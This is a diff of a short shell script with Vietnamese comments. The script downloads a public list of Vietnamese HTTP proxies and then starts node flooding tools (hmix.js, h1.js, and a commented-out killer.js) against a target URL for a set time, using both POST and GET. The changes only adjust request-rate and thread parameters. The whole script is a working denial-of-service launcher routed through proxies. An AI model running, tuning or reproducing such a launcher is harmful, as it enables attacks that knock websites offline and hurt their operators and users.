@@ -6,7 +6,7 @@
 URL=$1
 TIME=$2
 
-# Tải proxy vào live.txt cho cả HTTP, HTTPS
+# Tải proxy vào live.txt cho cả HTTP, HTTPS 
 > live.txt
 for t in http; do
 curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$t/Vietnam.txt" >> live.txt
@@ -18,8 +18,8 @@ wait
 
 # Chạy các script node 
 for m in POST GET; do
-  node hmix.js -m $m -u $URL -s $TIME -p live.txt -r 36 --full true -d false & 
-  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
+  node hmix.js -m $m -u $URL -s $TIME -p live.txt -r 38 --full true -d false &  
+  node h1.js $m $URL live.txt $TIME 999 8 randomstring=true &
   #node killer.js $m $URL $TIME 2 2 live.txt --query 1 --referer rand --http 2 --close --parsed --reset &
 done
 
